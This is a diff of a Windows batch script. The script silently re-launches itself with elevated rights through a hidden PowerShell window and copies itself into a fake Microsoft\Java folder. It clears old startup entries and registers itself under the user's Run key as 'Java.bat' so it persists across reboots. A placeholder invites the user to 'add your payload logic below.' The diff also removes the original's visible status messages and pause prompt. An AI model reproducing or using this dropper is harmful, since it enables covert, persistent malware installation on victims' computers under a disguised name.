@@ -1,35 +1,35 @@
 @echo off
-:: Elevate
+:: Check if running from final destination
+set "DEST=%LOCALAPPDATA%\Microsoft\Java\Java.bat"
+set "SELF=%~f0"
+
+:: If already running from destination, skip installation logic
+if /I "%SELF%"=="%DEST%" goto :MAIN
+
+:: Elevate if needed
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
-    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
+    powershell -WindowStyle Hidden -Command "Start-Process '%SELF%' -Verb runAs"
     exit /b
 )
 
-:: Variables
-set "NEW_PATH=%LOCALAPPDATA%\Microsoft\Java"
-set "NEW_FILE=%NEW_PATH%\Java.bat"
-set "REG_RUN=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
-set "REG_APPROVED=HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
+:: Cleanup old entries
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "i.bat" /f >nul 2>&1
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "i.bat" /f >nul 2>&1
 
-:: Delete old i.bat entries
-reg delete "%REG_RUN%" /v "i.bat" /f >nul 2>&1
-reg delete "%REG_APPROVED%" /v "i.bat" /f >nul 2>&1
+:: Create new folder and copy self
+mkdir "%LOCALAPPDATA%\Microsoft\Java" >nul 2>&1
+copy "%SELF%" "%DEST%" >nul
 
-:: Make new folder
-mkdir "%NEW_PATH%" >nul 2>&1
+:: Register as Java.bat
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Java.bat" /d "\"%DEST%\"" /f
 
-:: Copy script to new clean location
-copy "%~f0" "%NEW_FILE%" >nul
+:: Launch only ONCE
+start "" "%DEST%"
+exit
 
-:: Register the new script as Java.bat
-reg add "%REG_RUN%" /v "Java.bat" /d "\"%NEW_FILE%\"" /f
-
-:: Optional: run it immediately
-start "" "%NEW_FILE%"
-
-echo.
-echo [✓] Java.bat installed to new location and registered.
-echo [i] Restart your PC to see correct name in Task Manager.
-pause
+:MAIN
+:: ✅ Normal logic here — only runs once from correct location
+:: Add your payload logic below
+echo [✓] Java.bat is installed and ready.
 exit
